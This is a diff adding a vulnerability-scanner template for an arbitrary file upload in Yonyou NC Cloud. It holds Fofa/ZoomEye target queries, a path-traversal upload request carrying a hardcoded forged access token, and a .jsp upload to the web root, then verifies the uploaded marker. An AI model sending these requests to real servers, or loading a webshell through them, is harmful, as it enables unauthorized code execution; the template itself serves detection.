@@ -1,0 +1,41 @@
+id: yonyou-nccloud-uploadchunk-fileupload
+
+info:
+  name: ​用友NC Cloud uploadChunk 任意文件上传漏洞
+  author: zan8in
+  severity: critical
+  verified: true
+  description: |-
+    Fofa: app="用友-NC-Cloud"
+    ZoomEye: app:"Yonyou NC Cloud"
+  reference:
+    - https://mp.weixin.qq.com/s/fhyZhmqjJST7KEi1oiGm0g
+  tags: yonyou,nccloud,fileupload
+  created: 2023/12/07
+
+set:
+  randstr: randomLowercase(6)
+  randbody: randomLowercase(32)
+  rboundary: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /ncchr/pm/fb/attachment/uploadChunk?fileGuid=/../../../nccloud/&chunk=1&chunks=1
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+        accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
+      body: "\
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"file\"; filename=\"{{randstr}}.jsp\"\r\n\
+        \r\n\
+        {{randbody}}\r\n\
+        ------WebKitFormBoundary{{rboundary}}--\r\n\
+        "
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /nccloud/{{randstr}}.jsp
+    expression: response.status == 200 && response.body.bcontains(bytes(randbody))
+expression: r0() && r1()
